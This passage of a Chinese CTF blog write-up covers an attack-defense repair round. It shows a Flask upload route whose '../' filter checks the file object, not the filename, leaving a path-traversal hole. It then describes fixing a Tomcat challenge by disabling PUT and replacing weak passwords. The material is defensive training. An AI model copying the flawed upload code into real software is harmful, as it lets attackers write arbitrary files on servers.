+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;../&#x27;</span> <span class="keyword">in</span> file:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ban !&quot;</span></span><br><span class="line">    dst = os.path.join(<span class="string">&#x27;uploads&#x27;</span>, file.filename)</span><br><span class="line">    file.save(dst)</span><br><span class="line">    <span class="keyword">return</span> dst</span><br></pre></td></tr></table></figure>
+
+<h3 id="capture-the-cat"><a href="#capture-the-cat" class="headerlink" title="capture the cat"></a>capture the cat</h3><p>又是tomcat，在<code> /usr/local/tomcat/conf/</code>下找到web.xml和tomcat-user.xml文件，改下配置：</p>
+<p>首先把web.xml文件下的 readonly那里的false改成true，禁止put 。</p>
+<p><img src="https://img.picui.cn/free/2024/09/25/66f424a0788c9.png" alt="image-20240925172614205.png"></p>
+<p>然后tomcat-users.xml我们把密码改下，不让弱口令登录即可：</p>
+<p><img src="https://img.picui.cn/free/2024/09/25/66f424c0c21ee.png" alt="image-20240925172713979.png"></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这次RDG有个问题就是找服务所在路径的问题，其实可以通过关键词去搜索：</p>
+<p><code>find / -name php</code></p>
+<p><code>find / -name xxx</code></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/09/16/%E7%BE%8A%E5%9F%8E%E6%9D%AFMISC%E5%A4%8D%E7%8E%B0/" rel="prev" title="羊城杯MISC复现">
+                  <i class="fa fa-angle-left"></i> 羊城杯MISC复现
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">My0n9s</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
